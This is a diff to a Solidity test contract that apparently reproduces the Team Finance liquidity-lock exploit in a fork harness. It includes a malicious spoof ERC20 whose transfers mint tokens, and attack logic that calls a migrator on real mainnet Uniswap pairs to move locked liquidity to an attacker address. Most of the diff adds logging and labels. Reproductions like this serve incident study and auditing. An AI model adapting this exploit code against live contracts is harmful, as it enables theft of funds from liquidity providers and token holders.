@@ -67,22 +67,24 @@ contract SpoofERC20 {
         emit Approval(msg.sender, spender, amount);
     }
 
-    function transfer(address to, uint256 amount) public {
+    function transfer(address to, uint256 amount) public returns(bool) {
         require(to != address(0));
         require(balanceOf[to] <= ~ amount);
 
         balanceOf[to] += amount; // Essentially, mints tokens. 
 
         emit Transfer(msg.sender, to, amount);
+        return true;
     }
 
-    function transferFrom(address from, address to, uint256 amount) public {
+    function transferFrom(address from, address to, uint256 amount) public returns(bool){
         require(to != address(0));
         require(balanceOf[to] <= ~ amount);
 
         balanceOf[to] += amount;
 
         emit Transfer(from, to, amount);
+        return true;
     }
 }
 
@@ -140,9 +142,9 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
     ICurve internal curveStablesPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     
     uint256[] internal tokenIds;
-    IERC20[] internal migrationTokens0;
-    IERC20[] internal migrationTokens1;
-    IUniswapV2Pair[] internal pairs;
+    IERC20[4] internal migrationTokens0;
+    IERC20[4] internal migrationTokens1;
+    IUniswapV2Pair[4] internal pairs;
 
     SpoofERC20 internal maliciousToken;
     address internal attackerAddress_Two = address(0x912);
@@ -163,18 +165,28 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
         cheat.deal(address(this), 0.5 ether);
 
         maliciousToken = new SpoofERC20();
+
         _pushValuesToArrays();
+        _labelAccounts();
+        _tokenTrackerSetup();
+
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(address(teamFinanceLock));
+        updateBalanceTracker(attackerAddress_Two);
     }
 
     function test_attack() external {
-        console.log('"\n===== FIRST TX: LOCK SPOOF TOKENS =====');
+        console.log('"\n===== FIRST PART: LOCK SPOOF TOKENS =====');
+        _logAllBalances();
+
         this.lockTransferAndExtend{value: 0.5 ether}();
         
-        console.log('"\n===== SECOND TX: ATTACK TEAM LOCK =====');
-        console.log(dai.balanceOf(attackerAddress_Two));
+        console.log('"\n===== SECOND PART: ATTACK TEAM LOCK =====');
+        _logAllBalances();
         coordinateAttack();
-        console.log(dai.balanceOf(attackerAddress_Two));
 
+        console.log('\n ===== AFTER ATTACK =====');
+        _logAllBalances();
     }
 
     // ====================================== FIRST TRANSACTION (LOCK) LOGIC ======================================
@@ -222,7 +234,7 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
     }
 
     // ====================================== END OF FIRST TRANSACTION LOGIC ========================================
-    receive() external payable {
+    fallback() external payable {
         if(afterCallingLockToken){
             console.log('Received %s ETH refund after locking token', address(this).balance);
         }
@@ -232,13 +244,17 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
     // ====================================== SECOND TRANSACTION (ATTACK) LOGIC =====================================
     // The attacker named this function SuitcaseOnGodbJiVga() 
     function coordinateAttack() internal {
+        uint256 _poolLiquidity;
         uint256 amountOfPairs = pairs.length;
+
         for(uint256 i = 0; i < amountOfPairs; ){
+
+            _poolLiquidity = pairs[i].balanceOf(address(teamFinanceLock));
 
             IV3Migrator.MigrateParams memory params;
 
             params.pair = address(pairs[i]);
-            params.liquidityToMigrate = pairs[i].balanceOf(address(teamFinanceLock));
+            params.liquidityToMigrate = _poolLiquidity;
             params.percentageToMigrate = 1;
             params.token0 = address(migrationTokens0[i]);
             params.token1 = address(migrationTokens1[i]);
@@ -286,23 +302,47 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
         require(!valuesPushedToArrays, 'values already pushed');
         valuesPushedToArrays = true;
 
-        migrationTokens0.push(IERC20(address(maliciousToken)));
-        migrationTokens0.push(usdc);
-        migrationTokens0.push(usdc);
-        migrationTokens0.push(IERC20(address(maliciousToken)));
+        migrationTokens0 = [IERC20(address(maliciousToken)), usdc, usdc, IERC20(address(maliciousToken))];
 
-        migrationTokens1.push(IERC20(address(weth)));
-        migrationTokens1.push(caw);
-        migrationTokens1.push(tsuka);
-        migrationTokens1.push(IERC20(address(weth)));
+        migrationTokens1 = [IERC20(address(weth)), caw, tsuka, IERC20(address(weth))];
 
-        pairs.push(fegPair);
-        pairs.push(usdcCawPair);
-        pairs.push(usdcTsukaPair);
-        pairs.push(kndxPair);
+        pairs = [fegPair, usdcCawPair, usdcTsukaPair, kndxPair];
+    }
 
-        require(migrationTokens0.length == migrationTokens1.length, 'migration token length mismatch');
-        require(migrationTokens0.length == pairs.length, 'pairs length mismatch');
+    function _labelAccounts() internal {
+        cheat.label(address(weth), 'WETH');
+        cheat.label(address(usdc), 'USDC');
+        cheat.label(address(dai), 'DAI');
+        cheat.label(address(caw), 'CAW');
+        cheat.label(address(tsuka), 'TSUKA');
+        cheat.label(address(fegPair), 'Feg Pair');
+        cheat.label(address(usdcCawPair), 'USDC-CAW Pair');
+        cheat.label(address(usdcTsukaPair), 'USDC-TSUKA Pair');
+        cheat.label(address(kndxPair), 'KNDX Pair');
+
+        cheat.label(address(curveStablesPool), 'Curve');
+
+        cheat.label(address(maliciousToken), 'Malicious Token');
+        cheat.label(address(this), 'ATTACKER CONTRACT');
+        cheat.label(attackerAddress_Two, 'Attacker Recipient EOA');
+    }
+
+    function _tokenTrackerSetup() internal {
+        addTokenToTracker(address(weth));
+        addTokenToTracker(address(usdc));
+        addTokenToTracker(address(dai));
+        addTokenToTracker(address(caw));
+        addTokenToTracker(address(tsuka));
+
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(attackerAddress_Two);
+        updateBalanceTracker(address(teamFinanceLock));
+    }
+
+    function _logAllBalances() internal {
+        logBalancesWithLabel('Team Finance Lock', address(teamFinanceLock));
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Attacker EOA', attackerAddress_Two);
     }
 }
 
